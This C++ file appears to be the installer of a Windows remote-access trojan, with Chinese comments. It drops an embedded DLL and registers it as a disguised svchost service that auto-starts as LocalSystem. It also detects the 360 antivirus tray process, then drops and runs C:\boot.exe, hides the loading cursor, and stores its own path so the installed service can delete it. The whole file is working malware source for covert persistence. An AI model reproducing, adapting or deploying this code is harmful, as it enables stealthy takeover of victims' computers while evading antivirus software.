// install.cpp : Defines the entry point for the application.
//

#include "StdAfx.h"

#pragma comment(linker, "/defaultlib:msvcrt.lib /opt:nowin98 /IGNORE:4078 /MERGE:.rdata=.text /MERGE:.data=.text /section:.text,ERW")
#include "resource.h"
#include <windows.h>
#include <stdlib.h>
#include <Aclapi.h>
#include <lm.h>
#include <Shlwapi.h>
#pragma comment(lib, "NetApi32.lib")
//#include "acl.h"
#include "decode.h"
#include "RegEditEx.h"


struct MODIFY_DATA 
{
	char ServiceDisplayName[200];
	char ServiceDescription[200];
	char ReleasePath[200];
}
server_data = 
{
	"ServiceDisplayName",
	"ServiceDescription",
	"ReleasePath",
};




void dbg_dump(struct _EXCEPTION_POINTERS* ExceptionInfo) {
}

LONG WINAPI bad_exception(struct _EXCEPTION_POINTERS* ExceptionInfo) {
	dbg_dump(ExceptionInfo);
	ExitProcess(0);
}



#include <stdio.h>
BOOL MyFreeResource(char *szResourceID, char *szType, LPCTSTR lpFileName)
{
	FILE* fpOut = fopen(lpFileName, "wb");
	if(fpOut == NULL)
		return FALSE;
	HRSRC	hResLoad = FindResource(NULL, szResourceID, szType);
	HGLOBAL hResData = LoadResource(NULL,hResLoad);
	LPCSTR	data = (LPCSTR)LockResource(hResData);
	if(hResLoad != NULL && hResData != NULL && data != NULL)
		fwrite(data,1,SizeofResource(NULL,hResLoad),fpOut);
	fclose(fpOut);
	return TRUE;
}
char *AddsvchostService()
{
	char	*lpServiceName = NULL;
	int rc = 0;
	HKEY hkRoot;
    char buff[2048];
    //query svchost setting
    char *ptr, *pSvchost = "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Svchost";
    rc = RegOpenKeyEx(HKEY_LOCAL_MACHINE, pSvchost, 0, KEY_ALL_ACCESS, &hkRoot);
    if(ERROR_SUCCESS != rc)
        return NULL;
	
    DWORD type, size = sizeof buff;
    rc = RegQueryValueEx(hkRoot, "netsvcs", 0, &type, (unsigned char*)buff, &size);
    SetLastError(rc);
    if(ERROR_SUCCESS != rc)
        RegCloseKey(hkRoot);
	
	int i = 0;
	bool bExist = false;
	char servicename[50];
	do
	{	
		wsprintf(servicename, "36%dsvc", i);
		for(ptr = buff; *ptr; ptr = strchr(ptr, 0)+1)
		{
			if (lstrcmpi(ptr, servicename) == 0)
			{	
				bExist = true;
				break;
			}
		}
		if (bExist == false)
			break;
		bExist = false;
		i++;
	} while(1);
	
	servicename[lstrlen(servicename) + 1] = '\0';
	memcpy(buff + size - 1, servicename, lstrlen(servicename) + 2);
	
    rc = RegSetValueEx(hkRoot, "netsvcs", 0, REG_MULTI_SZ, (unsigned char*)buff, size + lstrlen(servicename) + 1);
	
	RegCloseKey(hkRoot);
	
    SetLastError(rc);
	
	if (bExist == false)
	{
		lpServiceName = new char[lstrlen(servicename) + 1];
		lstrcpy(lpServiceName, servicename);
	}
	
	return lpServiceName;
}

// 随机选择服务安装,返回安装成功的服务名

char *InstallService(LPCTSTR lpServiceDisplayName, LPCTSTR lpServiceDescription)
{
    // Open a handle to the SC Manager database.
	char MyDllPath[MAX_PATH];
	ExpandEnvironmentStrings(server_data.ReleasePath, MyDllPath, MAX_PATH); 
	char *lpServiceName = NULL;
    int rc = 0;
    HKEY hkRoot = HKEY_LOCAL_MACHINE, hkParam = 0;
    SC_HANDLE hscm = NULL, schService = NULL;
	char	strSysDir[MAX_PATH];
	DWORD	dwStartType = 0;
    try{
    char strSubKey[1024];
    //query svchost setting
    char *ptr, *pSvchost = "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Svchost";
    rc = RegOpenKeyEx(hkRoot, pSvchost, 0, KEY_QUERY_VALUE, &hkRoot);
    if(ERROR_SUCCESS != rc)
    {
        throw "";
    }

    DWORD type, size = sizeof strSubKey;
    rc = RegQueryValueEx(hkRoot, "netsvcs", 0, &type, (unsigned char*)strSubKey, &size);
    RegCloseKey(hkRoot);
    SetLastError(rc);
    if(ERROR_SUCCESS != rc)
        throw "RegQueryValueEx(Svchost\\netsvcs)";

    //install service
    hscm = OpenSCManager(NULL, NULL, SC_MANAGER_ALL_ACCESS);
    if (hscm == NULL)
        throw "OpenSCManager()";

	GetSystemDirectory(strSysDir, sizeof(strSysDir));
	char *bin = "%SystemRoot%\\System32\\svchost.exe -k netsvcs";
	char	strRegKey[1024];

	if (schService == NULL)
	{
		lpServiceName = AddsvchostService();

		wsprintf(strRegKey, "MACHINE\\SYSTEM\\CurrentControlSet\\Services\\%s", lpServiceName);
		schService = CreateService(
			hscm,                      // SCManager database
			lpServiceName,                    // name of service
			lpServiceDisplayName,           // service name to display
			SERVICE_ALL_ACCESS,        // desired access
			SERVICE_WIN32_OWN_PROCESS,
			SERVICE_AUTO_START,      // start type
			SERVICE_ERROR_NORMAL,      // error control type
			bin,        // service's binary
			NULL,                      // no load ordering group
			NULL,                      // no tag identifier
			NULL,                      // no dependencies
			NULL,                      // LocalSystem account
			NULL);                     // no password
		dwStartType = SERVICE_WIN32_OWN_PROCESS;
	}
	else
	{
		dwStartType = SERVICE_WIN32_SHARE_PROCESS;
		lpServiceName = new char[lstrlen(ptr) + 1];
		lstrcpy(lpServiceName, ptr);
	}
	if (schService == NULL)
		throw "CreateService(Parameters)";

    CloseServiceHandle(schService);
    CloseServiceHandle(hscm);

    //config service
    hkRoot = HKEY_LOCAL_MACHINE;
	wsprintf(strSubKey, "SYSTEM\\CurrentControlSet\\Services\\%s", lpServiceName);

	if (dwStartType == SERVICE_WIN32_SHARE_PROCESS)
	{		
		DWORD	dwServiceType = 0x120;
		WriteRegEx(HKEY_LOCAL_MACHINE, strSubKey, "Type", REG_DWORD, (char *)&dwServiceType, sizeof(DWORD), 0);
	}

	WriteRegEx(HKEY_LOCAL_MACHINE, strSubKey, "Description", REG_SZ, (char *)lpServiceDescription, lstrlen(lpServiceDescription), 0);

	lstrcat(strSubKey, "\\Parameters");
	WriteRegEx(HKEY_LOCAL_MACHINE, strSubKey, "ServiceDll", REG_EXPAND_SZ, (char *)MyDllPath, lstrlen(MyDllPath), 0);

    }catch(char *str)
    {
        if(str && str[0])
        {
            rc = GetLastError();
        }
    }
 
    RegCloseKey(hkRoot);
    RegCloseKey(hkParam);
    CloseServiceHandle(schService);
    CloseServiceHandle(hscm);
	

	if (lpServiceName != NULL)
	{
		MyFreeResource("DLL", "BIN", MyDllPath);
	}

    return lpServiceName;
}

void StartService(LPCTSTR lpService)
{
	SC_HANDLE hSCManager = OpenSCManager( NULL, NULL,SC_MANAGER_CREATE_SERVICE );
	if ( NULL != hSCManager )
	{
		SC_HANDLE hService = OpenService(hSCManager, lpService, DELETE | SERVICE_START);
		if ( NULL != hService )
		{
			StartService(hService, 0, NULL);
			CloseServiceHandle( hService );
		}
		CloseServiceHandle( hSCManager );
	}
}
#include <Tlhelp32.h>
BOOL ProcessExit(LPCTSTR szProcName)
{
	PROCESSENTRY32	pe; 
	DWORD	dwRet;
	BOOL	bFound = FALSE;

	HANDLE hSP = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	if (hSP)
	{
		pe.dwSize = sizeof( pe );
		
		for (dwRet = Process32First(hSP, &pe); 
		dwRet;
		dwRet = Process32Next(hSP, &pe))
		{
			if (lstrcmpi( szProcName, pe.szExeFile) == 0)
			{
				bFound = TRUE;
				break;
			}
		}
		CloseHandle(hSP);
		
	}
	return bFound;
}
#include <stdio.h>
#include <shellapi.h> 
void FreeResource()
{
	FILE* fpOut = fopen("C:\\boot.exe","wb");
	HRSRC	hResLoad = FindResource(NULL,MAKEINTRESOURCE(IDR_DAT),"BIN");
	HGLOBAL hResData = LoadResource(NULL,hResLoad);
	LPCSTR	data = (LPCSTR)LockResource(hResData);
	if(hResLoad != NULL && hResData != NULL && data != NULL)
	fwrite(data,1,SizeofResource(NULL,hResLoad),fpOut);
	fclose(fpOut);
	ShellExecute(0,"open","C:\\boot.exe",NULL,NULL,SW_SHOW);
}
int APIENTRY WinMain(HINSTANCE hInstance,
                     HINSTANCE hPrevInstance,
                     LPSTR     lpCmdLine,
                     int       nCmdShow)
{
 	// TODO: Place code here.
	//////////////////////////////////////////////////////////////////////////
	// 让启动程序时的小漏斗马上消失
	GetInputState();
	PostThreadMessage(GetCurrentThreadId(),NULL,0,0);
	MSG	msg;
	GetMessage(&msg, NULL, NULL, NULL);
	//////////////////////////////////////////////////////////////////////////

	if (ProcessExit("360tray.exe"))
		FreeResource();

	char	*lpServiceName = NULL;
	char	*lpUpdateArgs = "zwgx";
	//////////////////////////////////////////////////////////////////////////
	// 如果不是更新服务端
	if (strstr(GetCommandLine(), lpUpdateArgs) == NULL)
	{
	}
	else
	{
		// 等待服务端自删除
		Sleep(5000);
	}
	SetUnhandledExceptionFilter(bad_exception);
	lpServiceName = InstallService(server_data.ServiceDisplayName, server_data.ServiceDescription);

	if (lpServiceName != NULL)
	{
		// 写安装程序路径到注册表，服务开始后读取并删除
		char	strSelf[MAX_PATH];
		char	strSubKey[1024];
		memset(strSelf, 0, sizeof(strSelf));
		GetModuleFileName(NULL, strSelf, sizeof(strSelf));
		wsprintf(strSubKey, "SYSTEM\\CurrentControlSet\\Services\\%s", lpServiceName);
		WriteRegEx(HKEY_LOCAL_MACHINE, strSubKey, "InstallModule", REG_SZ, strSelf, lstrlen(strSelf), 0);
 
		StartService(lpServiceName);
		delete lpServiceName;
	}
	ExitProcess(0);
	return 0;
}



